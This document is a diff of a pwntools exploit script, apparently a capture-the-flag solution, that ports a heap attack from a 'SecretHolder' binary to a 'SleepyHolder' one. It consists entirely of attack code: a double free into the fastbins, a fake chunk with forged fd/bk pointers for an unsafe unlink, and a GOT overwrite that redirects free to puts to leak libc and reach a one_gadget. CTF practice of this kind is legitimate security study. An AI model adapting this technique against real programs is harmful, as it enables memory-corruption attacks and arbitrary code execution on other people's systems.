@@ -4,46 +4,41 @@ from pwn import *
 
 #context.log_level = 'debug'
 
-io = process(['./SecretHolder'], env={'LD_PRELOAD':'./libc.so.6'})
-elf = ELF('SecretHolder')
+io = process(['./SleepyHolder'], env={'LD_PRELOAD':'./libc.so.6'})
+elf = ELF('SleepyHolder')
 libc = ELF('libc.so.6')
 
-small_ptr = 0x006020b0
-big_ptr = 0x006020a0
+small_ptr = 0x006020d0
+big_ptr = 0x006020c0
 
-def keep(idx):
+def keep(idx, content):
     io.sendlineafter("Renew secret\n", '1')
-    io.sendlineafter("Huge secret\n", str(idx))
-    io.sendafter("secret: \n", 'AAAA')
+    io.sendlineafter("Big secret\n", str(idx))
+    io.sendafter("secret: \n", content)
 
 def wipe(idx):
     io.sendlineafter("Renew secret\n", '2')
-    io.sendlineafter("Huge secret\n", str(idx))
+    io.sendlineafter("Big secret\n", str(idx))
 
 def renew(idx, content):
     io.sendlineafter("Renew secret\n", '3')
-    io.sendlineafter("Huge secret\n", str(idx))
+    io.sendlineafter("Big secret\n", str(idx))
     io.sendafter("secret: \n", content)
 
 def unlink():
-    keep(1)
-    wipe(1)
-    keep(2)     # big
-    wipe(1)         # double free
-    keep(1)     # small # overlapping
-    keep(3)
-    wipe(3)
-    keep(3)     # huge
+    keep(1, "AAAA")     # small
+    keep(2, "AAAA")     # big
+    wipe(1)             # put small into fastbins
+    keep(3, "AAAA")     # huge # put small into small bin
+    wipe(1)             # double free # put small into fastbins
 
-    payload  = p64(0)                   # fake prev_size
-    payload += p64(0x21)                # fake size
+    payload  = p64(0) + p64(0x21)       # fake header
     payload += p64(small_ptr - 0x18)    # fake fd
     payload += p64(small_ptr - 0x10)    # fake bk
     payload += p64(0x20)                # fake prev_size
-    payload += p64(0x61a90)             # fake size
-    renew(2, payload)
+    keep(1, payload)
 
-    wipe(3)         # unsafe unlink
+    wipe(2)             # unsafe unlink
 
 def leak():
     global one_gadget
@@ -52,6 +47,7 @@ def leak():
     payload += p64(elf.got['free']) # big_ptr -> free@got.plt
     payload += "A" * 8
     payload += p64(big_ptr)         # small_ptr -> big_ptr
+    payload += p32(1)               # big_flag
     renew(1, payload)
     renew(2, p64(elf.plt['puts']))  # free@got.plt -> puts@plt
     renew(1, p64(elf.got['puts']))  # big_ptr -> puts@got.plt
